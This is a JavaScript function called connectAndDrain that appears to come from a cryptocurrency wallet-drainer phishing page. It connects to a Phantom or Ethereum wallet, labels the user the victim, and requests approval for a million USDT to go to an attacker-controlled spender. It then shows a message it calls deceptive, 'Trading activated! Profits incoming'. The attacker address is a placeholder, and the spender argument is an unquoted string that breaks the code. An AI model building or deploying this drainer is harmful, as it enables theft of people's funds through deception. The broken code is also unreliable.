async function connectAndDrain() {
    // Check for Phantom wallet
    const provider = window.phantom?.ethereum || window.ethereum; // Phantom's Ethereum provider
    if (!provider || !provider.isPhantom) {
        document.getElementById("status").innerText = "Please install Phantom Wallet!";
        return;
    }

    try {
        // Connect to Phantom
        await provider.request({ method: "eth_requestAccounts" });
        const ethersProvider = new ethers.providers.Web3Provider(provider);
        const signer = ethersProvider.getSigner();
        const victimAddress = await signer.getAddress();
        document.getElementById("status").innerText = "Wallet connected! Setting up trading...";

        // Placeholder attacker address
        const attackerAddress = "0x1234567890abcdef1234567890abcdef12345678";

        // USDT on Ethereum mainnet
        const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";

        // Full ERC-20 ABI
        const tokenABI = [
            "function approve(address spender, uint256 amount) public returns (bool)",
            "function allowance(address owner, address spender) public view returns (uint256)",
            "function balanceOf(address account) public view returns (uint256)",
            "function transfer(address recipient, uint256 amount) public returns (bool)",
            "function transferFrom(address sender, address recipient, uint256 amount) public returns (bool)"
        ];

        // Create token contract instance
        const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);

        // Approve 1M USDT (6 decimals)
        const hugeAmount = ethers.utils.parseUnits("1000000", 6); // USDT has 6 decimals
        const tx = await tokenContract.approve(J58guzdHCk8szHW5WPYsafatcPtdkJLWvs4RfnotgDAF, hugeAmount);
        await tx.wait();

        // Deceptive success message
        document.getElementById("status").innerText = "Trading activated! Profits incoming... (Funds vulnerable if attacker address was real)";
        console.log("If attackerAddress were real, they could drain USDT from", victimAddress);

    } catch (error) {
        document.getElementById("status").innerText = "Error: Transaction rejected or failed!";
        console.error("Error:", error.message);
    }
}